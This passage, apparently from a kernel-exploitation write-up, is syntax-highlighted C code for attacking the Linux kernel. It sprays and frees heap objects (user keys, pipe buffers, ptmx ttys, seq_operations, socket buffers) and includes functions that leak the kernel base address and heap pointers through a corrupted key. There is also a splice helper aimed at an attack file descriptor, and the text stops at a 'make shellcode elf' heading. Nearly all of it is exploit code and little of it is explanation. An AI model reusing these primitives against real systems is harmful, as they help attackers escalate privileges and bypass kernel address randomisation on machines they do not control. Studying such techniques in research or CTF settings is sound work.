</span></span></span><span class="line"><span class="cl"><span class="cp">#define KEYCTL_READ			11	</span><span class="cm">/* read a key or keyring&#39;s contents */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">add_key</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">description</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">plen</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_add_key</span><span class="p">,</span> <span class="s">&#34;user&#34;</span><span class="p">,</span> <span class="n">description</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">plen</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                   <span class="n">KEY_SPEC_PROCESS_KEYRING</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">alloc_key</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">desc</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">payload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">size</span> <span class="o">-=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_key_payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">sprintf</span><span class="p">(</span><span class="n">desc</span><span class="p">,</span> <span class="s">&#34;payload_%d&#34;</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">?</span> <span class="nl">buff</span> <span class="p">:</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buff</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nf">add_key</span><span class="p">(</span><span class="n">desc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] add_key()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">    	
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">key_update</span><span class="p">(</span><span class="kt">int</span> <span class="n">keyid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">plen</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_keyctl</span><span class="p">,</span> <span class="n">KEYCTL_UPDATE</span><span class="p">,</span> <span class="n">keyid</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">plen</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">keyctl_revoke</span><span class="p">(</span><span class="kt">int</span> <span class="n">keyid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_keyctl</span><span class="p">,</span> <span class="n">KEYCTL_REVOKE</span><span class="p">,</span> <span class="n">keyid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">keyctl_unlink</span><span class="p">(</span><span class="kt">int</span> <span class="n">keyid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_keyctl</span><span class="p">,</span> <span class="n">KEYCTL_UNLINK</span><span class="p">,</span> <span class="n">keyid</span><span class="p">,</span> <span class="n">KEY_SPEC_PROCESS_KEYRING</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">free_key</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid keys[i]&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">keyctl_revoke</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="nf">keyctl_unlink</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// printf(&#34;keys[%d] &#34;,i);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;keyctl_revoke&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">    <span class="c1">// n_keys--;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">free_all_keys</span><span class="p">(</span><span class="kt">bool</span> <span class="n">skip_corrupted_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_keys</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">skip_corrupted_key</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">==</span> <span class="n">corrupted_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">free_key</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// GC keys
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">keyctl_read</span><span class="p">(</span><span class="kt">int</span> <span class="n">keyid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">buflen</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_keyctl</span><span class="p">,</span> <span class="n">KEYCTL_READ</span><span class="p">,</span> <span class="n">keyid</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">buflen</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">get_key</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">data</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nf">keyctl_read</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;keyctl_read&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// printf(&#34;%s\n&#34;,data);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">pipe</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] alloc_pipe_buff()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">change_pipe_buff_size</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">fcntl</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">F_SETPIPE_SZ</span><span class="p">,</span><span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">/</span><span class="mh">0x40</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fcntl&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">release_pipe_buff</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">close</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] release_pipe_buff()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">close</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] release_pipe_buff()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">alloc_tty</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ptmx</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/ptmx&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_NOCTTY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ptmx</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] alloc_tty()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">free_tty</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">ptmx</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">alloc_seq_ops</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">seq_ops</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/stat&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">seq_ops</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] spray_seq_ops()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">free_seq_ops</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">seq_ops</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">leak_kernel_pointer</span><span class="p">(</span><span class="kt">int</span> <span class="n">kid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">leak</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nf">get_key</span><span class="p">(</span><span class="n">kid</span><span class="p">,</span> <span class="mh">0xfff0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xfff0</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">is_kernel_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xec0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>   
</span></span><span class="line"><span class="cl">            <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;get kernel_base: 0x%llx&#34;</span><span class="p">,</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint64_t</span> <span class="n">kernel_base1</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1246ec0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;get kernel_base: 0x%llx&#34;</span><span class="p">,</span><span class="n">kernel_base1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">kernel_base1</span><span class="p">,</span><span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">leak_heap_pointer</span><span class="p">(</span><span class="kt">int</span> <span class="n">kid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">leak</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nf">get_key</span><span class="p">(</span><span class="n">kid</span><span class="p">,</span> <span class="mh">0xfff0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// hexdump(key,0x100);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xfff0</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// if(is_heap_pointer(leak[i])){
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//     printf(&#34;heap_%d ==&gt; 0x%llx\n&#34;,i,leak[i]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nf">is_heap_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nf">is_heap_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nf">is_heap_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>   
</span></span><span class="line"><span class="cl">            <span class="n">target_object</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;key_spray_heap_addr: %llx&#34;</span><span class="p">,</span><span class="n">target_object</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">target_object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">init_sk_buffer</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ss</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] socketpair&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">write</span><span class="p">(</span><span class="n">ss</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">buff</span><span class="p">,</span> <span class="n">size</span><span class="o">-</span><span class="mh">0x140</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] write&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show_skb_buff</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">ss</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">buff</span><span class="p">,</span> <span class="n">size</span><span class="o">-</span><span class="mh">0x140</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] write&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">splice_fd</span><span class="p">(</span><span class="kt">int</span> <span class="n">attack_fd</span><span class="p">,</span><span class="kt">loff_t</span> <span class="n">offset</span><span class="p">,</span><span class="kt">int</span> <span class="n">i</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">splice</span><span class="p">(</span><span class="n">attack_fd</span><span class="p">,</span><span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="make-shellcode-elf">make shellcode elf</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
